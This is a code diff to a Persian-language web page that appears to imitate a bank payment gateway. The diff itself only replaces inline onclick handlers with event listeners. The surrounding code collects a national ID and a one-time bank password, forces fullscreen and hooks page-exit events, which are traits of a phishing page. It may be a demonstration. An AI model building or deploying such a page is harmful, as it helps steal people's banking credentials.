@@ -292,7 +292,7 @@
                 <label for="fake-field">کد ملی (اختیاری)</label>
                 <input type="text" id="fake-field" placeholder="123-456-789" maxlength="12" autocomplete="off">
             </div>
-            <button class="btn btn-primary" onclick="x.nextStep(1)">مرحله بعد</button>
+            <button class="btn btn-primary" id="next-step-1">مرحله بعد</button>
         </div>
 
         <div class="step" id="step-2">
@@ -303,10 +303,10 @@
             <div class="form-group">
                 <label for="otp">رمز پویا</label>
                 <input type="text" id="otp" placeholder="******" maxlength="6" autocomplete="off">
-                <button class="btn btn-secondary" onclick="x.requestOTP()">درخواست رمز پویا</button>
+                <button class="btn btn-secondary" id="request-otp">درخواست رمز پویا</button>
             </div>
             <div class="timer" id="otp-timer"></div>
-            <button class="btn btn-primary" onclick="x.nextStep(2)">تأیید و پرداخت</button>
+            <button class="btn btn-primary" id="next-step-2">تأیید و پرداخت</button>
         </div>
 
         <div class="step" id="step-3">
@@ -314,8 +314,8 @@
             <div class="loader" id="loader"></div>
         </div>
 
-        <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
-        <button class="btn btn-clear" id="clear-data-btn" onclick="x.clearData()">پاک کردن اطلاعات</button>
+        <button class="btn btn-cancel" id="cancel-btn">انصراف</button>
+        <button class="btn btn-clear" id="clear-data-btn">پاک کردن اطلاعات</button>
         <div class="user-data" id="user-data"></div>
     </div>
 
@@ -325,7 +325,7 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        const x = (function() {
+        document.addEventListener('DOMContentLoaded', function() {
             const steps = document.querySelectorAll('.step');
             const progressFill = document.getElementById('progress-fill');
             const userDataDiv = document.getElementById('user-data');
@@ -347,6 +347,7 @@
                 setupScreenshotProtection();
                 window.addEventListener('beforeunload', handlePageExit);
                 document.addEventListener('fullscreenchange', handleFullscreenExit);
+                setupButtonListeners();
             }
 
             function enterFullscreen() {
@@ -402,6 +403,14 @@
                 document.getElementById('otp').addEventListener('blur', e => updateUserData('رمز پویا', e.target.value));
 
                 document.getElementById('fake-field').addEventListener('blur', e => updateUserData('کد ملی', e.target.value));
+            }
+
+            function setupButtonListeners() {
+                document.getElementById('next-step-1').addEventListener('click', () => nextStep(1));
+                document.getElementById('next-step-2').addEventListener('click', () => nextStep(2));
+                document.getElementById('request-otp').addEventListener('click', requestOTP);
+                document.getElementById('cancel-btn').addEventListener('click', cancel);
+                document.getElementById('clear-data-btn').addEventListener('click', clearData);
             }
 
             function enterAdminMode() {
@@ -624,14 +633,7 @@
             }
 
             init();
-
-            return {
-                nextStep,
-                requestOTP,
-                cancel,
-                clearData
-            };
-        })();
+        });
     </script>
 </body>
 </html>
